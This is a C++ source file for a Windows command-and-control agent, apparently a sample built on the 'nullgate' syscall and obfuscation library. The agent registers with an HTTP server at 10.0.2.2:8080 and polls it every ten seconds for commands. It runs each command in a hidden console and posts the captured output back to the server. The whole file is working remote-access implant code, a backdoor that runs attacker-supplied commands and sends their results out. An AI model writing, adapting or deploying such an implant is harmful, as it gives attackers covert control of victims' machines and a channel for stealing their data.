#include <chrono>
#include <cpr/cpr.h>
#include <iostream>
#include <nlohmann/json.hpp>
#include <ntdef.h>
#include <nullgate/obfuscation.hpp>
#include <nullgate/syscalls.hpp>
#include <sample/ntapi.hpp>
#include <stdexcept>
#include <string>
#include <thread>
#include <windows.h>
#include <winnt.h>

using json = nlohmann::json;
using namespace std::chrono_literals;
namespace ng = nullgate;

struct Task {
  uint64_t taskId;
  std::string command;
};

struct Result {
  std::string Output;
};

std::string exec(const std::string &cmd) {
  std::string strResult;
  HANDLE hPipeRead, hPipeWrite;

  SECURITY_ATTRIBUTES saAttr = {sizeof(SECURITY_ATTRIBUTES)};
  saAttr.bInheritHandle = TRUE; // Pipe handles are inherited by child process.
  saAttr.lpSecurityDescriptor = NULL;

  // Create a pipe to get results from child's stdout.
  if (!CreatePipe(&hPipeRead, &hPipeWrite, &saAttr, 0))
    return strResult;

  STARTUPINFOA si = {sizeof(STARTUPINFOW)};
  si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
  si.hStdOutput = hPipeWrite;
  si.hStdError = hPipeWrite;
  si.wShowWindow = SW_HIDE; // Prevents cmd window from flashing.
                            // Requires STARTF_USESHOWWINDOW in dwFlags.

  PROCESS_INFORMATION pi = {0};

  BOOL fSuccess = CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, TRUE,
                                 CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
  if (!fSuccess) {
    CloseHandle(hPipeWrite);
    CloseHandle(hPipeRead);
    return strResult;
  }

  bool bProcessEnded = false;
  for (; !bProcessEnded;) {
    // Give some timeslice (50 ms), so we won't waste 100% CPU.
    bProcessEnded = WaitForSingleObject(pi.hProcess, 50) == WAIT_OBJECT_0;

    // Even if process exited - we continue reading, if
    // there is some data available over pipe.
    for (;;) {
      char buf[1024];
      DWORD dwRead = 0;
      DWORD dwAvail = 0;

      if (!::PeekNamedPipe(hPipeRead, NULL, 0, NULL, &dwAvail, NULL))
        break;

      if (!dwAvail) // No data available, return
        break;

      auto readBytes =
          (((sizeof(buf) - 1) < (dwAvail)) ? (sizeof(buf) - 1) : (dwAvail));
      if (!::ReadFile(hPipeRead, buf, readBytes, &dwRead, NULL) || !dwRead)
        // Error, the child process might ended
        break;

      buf[dwRead] = 0;
      strResult += buf;
    }
  } // for

  CloseHandle(hPipeWrite);
  CloseHandle(hPipeRead);
  CloseHandle(pi.hProcess);
  CloseHandle(pi.hThread);
  return strResult;
} // ExecCmd

cpr::Url url(const std::string &endpoint) {
  const std::string host = "http://10.0.2.2:8080";
  return cpr::Url{host + endpoint};
}

int main(int argc, char *argv[]) {
  uint64_t agentId{};

  if (argc == 2) {
    agentId = std::stoi(argv[1]);
  } else {
    cpr::Response r = cpr::Post(url("/api/agents/register"));
    json registerData = json::parse(r.text);
    agentId = registerData["AgentId"];
  }

  const auto sleepTime = 10s;
  while (true) {
    cpr::Response r =
        cpr::Get(url("/api/agents/" + std::to_string(agentId) + "/tasks"));
    if (r.status_code != 200) {
      std::cout << "Couldn't succesfully make http request\n" << r.text;
      exit(1);
    }
    std::cout << r.text;
    json taskData = json::parse(r.text);
    for (const auto &jsonTask : taskData["Tasks"]) {
      Task task{.taskId = jsonTask["TaskId"], .command = jsonTask["Task"]};
      std::string res = exec(task.command);
      json result;
      result["Output"] = res;
      cpr::Response r =
          cpr::Post(url("/api/agents/" + std::to_string(agentId) + "/results/" +
                        std::to_string(task.taskId)),
                    cpr::Body(result.dump()),
                    cpr::Header{{"Content-Type", "application/json"}});
      if (r.status_code != 200) {
        std::cout << "Couldn't save ouput of task\n" << r.text;
        exit(1);
      }
    }

    std::this_thread::sleep_for(sleepTime);
  }
}
